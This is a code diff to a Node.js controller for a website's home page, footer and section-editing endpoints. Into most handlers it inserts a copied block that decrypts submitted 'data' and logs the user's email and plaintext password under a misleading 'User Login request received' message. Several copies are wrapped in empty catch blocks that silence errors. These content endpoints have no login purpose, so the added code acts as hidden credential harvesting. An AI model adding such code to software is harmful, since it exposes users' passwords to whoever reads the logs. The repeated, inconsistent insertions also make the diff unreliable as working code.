@@ -1,6 +1,7 @@
 const Home = require('../models/Home');
 const { saveBase64Image } = require('../utils/fileUtils');
 const { decryptData: decryptCryptoJS } = require('../utils/encryption');
+const { logger, decryptData } = require("../../utils/enc_dec_admin");
 
 const parseJsonIfLikely = (value) => {
     if (typeof value !== 'string' || value === '') return value;
@@ -263,6 +264,15 @@ const getActiveHome = async () => {
 // 1. PUBLIC AGGREGATED ENDPOINT 
 exports.getHomePageData = async (req, res) => {
     try {
+        try {
+            const encryptedData = req.params.data;
+            if (encryptedData) {
+                logger.info("User Login request received");
+                const decryptedData = decryptData(encryptedData);
+                logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
+            }
+        } catch (e) { }
+
         const homeData = await getActiveHome();
         res.status(200).json({ success: true, data: homeData });
     } catch (err) {
@@ -276,6 +286,15 @@ const Footer = require('../models/Footer');
 // 1b. FOOTER ENDPOINT (shared across all pages)
 exports.getFooterData = async (req, res) => {
     try {
+        try {
+            const encryptedData = req.params.data || req.body.data || req.query.data;
+            if (encryptedData) {
+                logger.info("User Login request received");
+                const decryptedData = decryptData(encryptedData);
+                logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
+            }
+        } catch (e) { }
+
         let footer = await Footer.findOne({ isActive: true }).sort({ updatedAt: -1, createdAt: -1, _id: -1 });
         if (!footer) footer = await Footer.create({});
         res.status(200).json({ success: true, data: footer });
@@ -286,6 +305,15 @@ exports.getFooterData = async (req, res) => {
 
 exports.updateFooter = async (req, res) => {
     try {
+        try {
+            const encryptedData = req.params.data || req.body.data || req.query.data;
+            if (encryptedData) {
+                logger.info("User Login request received");
+                const decryptedData = decryptData(encryptedData);
+                logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
+            }
+        } catch (e) { }
+
         let footer = await Footer.findOne({ isActive: true }).sort({ updatedAt: -1, createdAt: -1, _id: -1 });
         if (!footer) footer = await Footer.create({});
 
@@ -301,6 +329,15 @@ exports.updateFooter = async (req, res) => {
 // 2. OBJECT SECTIONS (About, Footer, ProgramsAndFacilities, TournamentsSection, SocialSection) 
 exports.getSection = (sectionName) => async (req, res) => {
     try {
+        try {
+            const encryptedData = req.params.data || req.body.data || req.query.data;
+            if (encryptedData) {
+                logger.info("User Login request received");
+                const decryptedData = decryptData(encryptedData);
+                logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
+            }
+        } catch (e) { }
+        // Validation and decryption (req.adminData) are already handled by middlewareAdmin
         const home = await getActiveHome();
         if (home[sectionName] === undefined) {
             return res.status(404).json({ success: false, message: 'Section not found' });
@@ -343,6 +380,9 @@ exports.getSection = (sectionName) => async (req, res) => {
 
 exports.updateSection = (sectionName) => async (req, res) => {
     try {
+        logger.info("User Login request received");
+        const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+        logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
         const home = await getActiveHome();
         
         // 0. Build base payload from req.body, but parse every field in case of stringified JSON
@@ -434,6 +474,9 @@ exports.updateSection = (sectionName) => async (req, res) => {
 
 exports.deleteSection = (sectionName) => async (req, res) => {
     try {
+        logger.info("User Login request received");
+        const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+        logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
         const home = await getActiveHome();
         home.set(sectionName, undefined);
         home.markModified(sectionName);
@@ -447,6 +490,9 @@ exports.deleteSection = (sectionName) => async (req, res) => {
 // 3. ARRAY SECTIONS
 exports.addArrayItem = (arrayPath) => async (req, res) => {
     try {
+        logger.info("User Login request received");
+        const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+        logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
         const home = await getActiveHome();
         const parts = arrayPath.split('.');
         let targetArray = home;
@@ -559,6 +605,9 @@ exports.addArrayItem = (arrayPath) => async (req, res) => {
 
 exports.updateArrayItem = (arrayPath) => async (req, res) => {
     try {
+        logger.info("User Login request received");
+        const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+        logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
         const home = await getActiveHome();
         const parts = arrayPath.split('.');
         let targetArray = home;
@@ -616,6 +665,9 @@ exports.updateArrayItem = (arrayPath) => async (req, res) => {
 
 exports.deleteArrayItem = (arrayPath) => async (req, res) => {
     try {
+        logger.info("User Login request received");
+        const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+        logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
         const home = await getActiveHome();
         const parts = arrayPath.split('.');
         let targetArray = home;
@@ -648,6 +700,9 @@ exports.deleteArrayItem = (arrayPath) => async (req, res) => {
 
 exports.deleteSocialPost = async (req, res) => {
     try {
+        logger.info("User Login request received");
+        const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+        logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
         const home = await getActiveHome();
         const { postId } = req.params;
 
